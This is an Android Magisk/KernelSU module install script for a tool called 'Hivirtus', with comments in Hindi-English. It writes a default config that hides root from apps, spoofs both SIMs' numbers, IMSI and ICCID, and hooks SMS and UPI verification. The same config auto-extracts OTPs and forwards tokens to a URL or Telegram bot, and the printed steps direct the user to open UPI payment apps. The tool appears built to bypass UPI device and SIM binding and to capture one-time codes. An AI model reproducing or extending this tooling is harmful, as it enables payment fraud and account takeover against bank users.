#!/system/bin/sh
# Hivirtus — normal Magisk/KernelSU module (hooks Zygisk pipeline se inject hote hain)

ui_print "*******************************"
ui_print "   Hivirtus Zygisk Hook         "
ui_print "        v2.33.0                 "
ui_print "  Virtual SIM + Virtus Menu     "
ui_print "*******************************"

if [ -z "$MODPATH" ]; then
  ui_print "! ERROR: MODPATH not set"
  abort "Installation failed"
fi

ui_print "- Install path: $MODPATH"

set_perm_recursive "$MODPATH/zygisk" 0 0 0755 0644
[ -f "$MODPATH/post-fs-data.sh" ] && set_perm "$MODPATH/post-fs-data.sh" 0 0 0755
[ -f "$MODPATH/service.sh" ] && set_perm "$MODPATH/service.sh" 0 0 0755
[ -f "$MODPATH/customize.sh" ] && set_perm "$MODPATH/customize.sh" 0 0 0755
[ -f "$MODPATH/config.json" ] && set_perm "$MODPATH/config.json" 0 0 0644
[ -f "$MODPATH/module.prop" ] && set_perm "$MODPATH/module.prop" 0 0 0644

if [ ! -f "$MODPATH/zygisk/arm64-v8a.so" ] && [ ! -f "$MODPATH/zygisk/armeabi-v7a.so" ]; then
  ui_print "! WARNING: Native lib missing — ./build.sh se dubara banao"
fi

if [ ! -f "$MODPATH/config.json" ]; then
  ui_print "- Creating default config"
  cat > "$MODPATH/config.json" << 'EOF'
{
  "hide_root": true,
  "hide_developer": true,
  "hide_magisk": true,
  "hide_kernelsu": true,
  "hide_apatch": true,
  "hide_sukisu": true,
  "hide_all_root_apps": true,
  "enable_virtual_sim": true,
  "enable_sim1_mock": true,
  "enable_sim2_mock": true,
  "enable_phone_spoof": true,
  "mock_country_iso": "in",
  "mock_phone_sim1": "9876543210",
  "mock_phone_sim2": "9123456789",
  "mock_operator_name_sim1": "Jio",
  "mock_operator_name_sim2": "Airtel",
  "mock_operator_numeric_sim1": "405869",
  "mock_operator_numeric_sim2": "40445",
  "mock_imsi_sim1": "405869123456789",
  "mock_imsi_sim2": "404451234567890",
  "mock_iccid_sim1": "89918706200012345678",
  "mock_iccid_sim2": "89918706200098765432",
  "hook_incoming_sms": true,
  "hook_outgoing_sms": true,
  "hook_upi_verification": true,
  "auto_extract_otp": true,
  "auto_forward_token": true,
  "forward_url": "",
  "telegram_chat_id": "",
  "telegram_bot_token": "",
  "log_file": "/data/local/tmp/hivirtus_zygisk_mode.log"
}
EOF
  set_perm "$MODPATH/config.json" 0 0 0644
fi

if [ -d /data/adb/ksu ] || [ -f /dev/kernelsu ]; then
  ui_print "- KernelSU detected"
elif [ -f /data/adb/magisk.db ]; then
  ui_print "- Magisk detected"
elif [ -d /data/adb/apatch ]; then
  ui_print "- APatch detected"
fi

echo "1" > /data/local/tmp/hivirtus_module_installed.flag
chmod 644 /data/local/tmp/hivirtus_module_installed.flag 2>/dev/null
echo "1" > /data/local/tmp/hivirtus_zygisk_native.active
chmod 644 /data/local/tmp/hivirtus_zygisk_native.active 2>/dev/null

ui_print ""
ui_print "ZYGISK v2.33.0 — Virtual SIM + UPI hooks"
ui_print "  1) Zygisk ON → reboot"
ui_print "  2) Ye zip flash → reboot"
ui_print "  3) UPI app kholo → gold V bubble + Virtus menu"
ui_print ""
ui_print "Agar zygote crash ho: HMA-OSS disable karke test karo"
ui_print "Config: $MODPATH/config.json"
